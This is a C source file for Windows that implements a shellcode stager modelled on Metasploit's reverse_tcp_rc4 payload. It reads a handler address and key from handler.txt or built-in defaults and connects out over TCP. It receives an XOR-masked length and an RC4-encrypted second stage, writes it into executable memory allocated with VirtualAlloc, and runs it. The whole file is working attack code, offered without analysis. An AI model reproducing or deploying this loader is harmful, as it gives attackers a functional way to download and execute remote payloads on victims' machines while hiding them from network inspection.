#include <io.h>
#include <stdio.h>
#include <winsock2.h>
#include <windows.h>

#include "rc4.h"
#include "sha1.h"

#define TOKEN ":"
#define HOST "0.0.0.0"
#define PORT "443"
#define RC4PASS "pass"

static SOCKET WSOCKET;

static void ws_init() {
  WSADATA wsa;
  WSAStartup(MAKEWORD(2, 2), &wsa);
}

static SOCKET ws_connect(char *ip, char *port) {
  SOCKADDR_IN sa = {0};
  sa.sin_family = AF_INET;
  sa.sin_port = htons(atoi(port));
  sa.sin_addr.s_addr = inet_addr(ip);

  SOCKET s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
  if (connect(s, (SOCKADDR *)&sa, sizeof(sa)) == SOCKET_ERROR) {
    exit(0);
  }
  return s;
}

static int recv_all(SOCKET s, char *buf, int len) {
  int ret = 0;
  while (ret < len) {
    ret += recv(s, buf + ret, len - ret, 0);
  }
  return ret;
}

static char *trim(char *str) {
  char *ptr = str;
  int len = strlen(ptr);

  while (isspace(ptr[len - 1])) {
    ptr[--len] = 0;
  }
  while (*ptr && isspace(*ptr)) {
    ++ptr, --len;
  }

  memmove(str, ptr, len + 1);
  return str;
}

static char *readFile() {
  FILE *file = fopen("handler.txt", "rb");

  fseek(file, 0, SEEK_END);
  int len = ftell(file);
  rewind(file);

  char *text = malloc(len + 1);
  fread(text, sizeof(char), len, file);
  text[len] = 0;
  fclose(file);

  return text;
}

static char *getHandler(int *rawSize) {
  char *host;
  char *port;
  char *rc4pass;
  if (access("handler.txt", F_OK) == 0) {
    char *text = trim(readFile());
    host = strtok(text, TOKEN);
    port = strtok(0, TOKEN);
    rc4pass = strtok(0, TOKEN);
  } else {
    host = HOST;
    port = PORT;
    rc4pass = RC4PASS;
  }

  ws_init();
  WSOCKET = ws_connect(host, port);

  unsigned char key[SHA1_DIGEST_SIZE + 1];
  key[SHA1_DIGEST_SIZE] = 0;
  sha1_buffer(rc4pass, strlen(rc4pass), key);
  unsigned char *rc4key = key + 4;
  int xorkey = 0;
  for (int i = 0; i < 4; i++) {
    xorkey ^= key[i] << i * 8;
  }

  int size;
  recv(WSOCKET, (char *)&size, 4, 0);
  size ^= xorkey;

  *rawSize = size + 5;
  char *buf = malloc(*rawSize);

  // BF 78 56 34 12 => mov edi, 0x12345678
  buf[0] = 0xBF;
  memcpy(buf + 1, &WSOCKET, 4);

  recv_all(WSOCKET, buf + 5, size);

  RC4((char *)rc4key, buf + 5, size);

  return buf;
}

int main() {
  int rawSize;
  char *raw = getHandler(&rawSize);

  void *ptr = VirtualAlloc(0, rawSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
  memcpy(ptr, raw, rawSize);
  free(raw);
  ((void (*)())ptr)();

  return 0;
}

/*
https://github.com/rapid7/metasploit-framework/blob/master/lib/msf/core/payload/windows/x64/reverse_tcp_rc4.rb
*/
